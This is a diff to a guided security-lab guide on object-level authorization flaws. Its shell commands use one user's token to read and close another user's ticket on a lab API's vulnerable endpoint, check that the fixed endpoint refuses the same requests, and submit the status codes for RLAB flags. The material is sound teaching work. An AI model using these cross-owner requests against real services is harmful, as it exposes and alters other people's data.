@@ -16,7 +16,7 @@ The browser application at `http://127.0.0.1:5173/`. Save the Finding / Evidence
 
 **Level:** Intermediate · **Mode:** Guided · **Time:** 70 minutes
 
-**Difficulty band:** intermediate-foundations
+**Difficulty band:** intermediate-capstone
 
 ## Scenario
 
@@ -106,17 +106,27 @@ curl -sS -X POST -H 'Content-Type: application/json' -d '{}' http://ticket-api:8
 case_id=$(jq -r .case_id /tmp/case.json)
 mina_token=$(jq -r .users.mina.token /tmp/case.json)
 noah_token=$(jq -r .users.noah.token /tmp/case.json)
+mina_ticket=$(jq -r .tickets.mina /tmp/case.json)
 noah_ticket=$(jq -r .tickets.noah /tmp/case.json)
-curl -sS -H "X-Lab-Token: $mina_token" "http://ticket-api:8080/vulnerable/tickets/$noah_ticket"
-curl -sS -X PATCH -H 'Content-Type: application/json' -H "X-Lab-Token: $mina_token" -d '{"status":"closed"}' "http://ticket-api:8080/vulnerable/tickets/$noah_ticket"
+status() { curl -sS -o /tmp/ticket-response.json -w '%{http_code}' "$@"; }
+
+vulnerable_cross_owner_read=$(status -H "X-Lab-Token: $mina_token" "http://ticket-api:8080/vulnerable/tickets/$noah_ticket")
+vulnerable_cross_owner_write=$(status -X PATCH -H 'Content-Type: application/json' -H "X-Lab-Token: $mina_token" -d '{"status":"closed"}' "http://ticket-api:8080/vulnerable/tickets/$noah_ticket")
+fixed_cross_owner_read=$(status -H "X-Lab-Token: $mina_token" "http://ticket-api:8080/fixed/tickets/$noah_ticket")
+fixed_cross_owner_write=$(status -X PATCH -H 'Content-Type: application/json' -H "X-Lab-Token: $mina_token" -d '{"status":"closed"}' "http://ticket-api:8080/fixed/tickets/$noah_ticket")
+fixed_owner_read=$(status -H "X-Lab-Token: $noah_token" "http://ticket-api:8080/fixed/tickets/$noah_ticket")
+fixed_owner_write=$(status -X PATCH -H 'Content-Type: application/json' -H "X-Lab-Token: $mina_token" -d '{"status":"open"}' "http://ticket-api:8080/fixed/tickets/$mina_ticket")
 ```
 
-Repeat GET and PATCH with the `/fixed/` prefix for Mina, then use Noah's token. The six statuses are `200, 200, 403, 403, 200, 200` in the objective's listed order.
-
-**TOOLBOX — submit evidence and controls**
+**TOOLBOX — derive the report from the six captured statuses**
 
 ```sh
-observations='{"vulnerable_cross_owner_read":200,"vulnerable_cross_owner_write":200,"fixed_cross_owner_read":403,"fixed_cross_owner_write":403,"fixed_owner_read":200,"fixed_owner_write":200}'
+observations=$(jq -cn \
+  --argjson a "$vulnerable_cross_owner_read" --argjson b "$vulnerable_cross_owner_write" \
+  --argjson c "$fixed_cross_owner_read" --argjson d "$fixed_cross_owner_write" \
+  --argjson e "$fixed_owner_read" --argjson f "$fixed_owner_write" \
+  '{vulnerable_cross_owner_read:$a,vulnerable_cross_owner_write:$b,fixed_cross_owner_read:$c,fixed_cross_owner_write:$d,fixed_owner_read:$e,fixed_owner_write:$f}')
+printf '%s\n' "$observations" | jq .
 exposure=$(jq -cn --arg case_id "$case_id" --argjson observations "$observations" '{case_id:$case_id,observations:$observations}' | curl -sS -X POST -H 'Content-Type: application/json' --data-binary @- http://ticket-api:8080/reports/exposure)
 printf '%s\n' "$exposure" | jq .
 exposure_token=$(printf '%s' "$exposure" | jq -r .exposure_token)
@@ -128,6 +138,8 @@ jq -cn --arg case_id "$case_id" --arg exposure_token "$exposure_token" '{case_id
 ```sh
 node scripts/standalone-labctl.mjs verify 14-object-authorization exposure-report 'RLAB{...}'
 ```
+
+**HOST — submit the remediation flag**
 
 ```sh
 node scripts/standalone-labctl.mjs verify 14-object-authorization remediation-proof 'RLAB{...}'
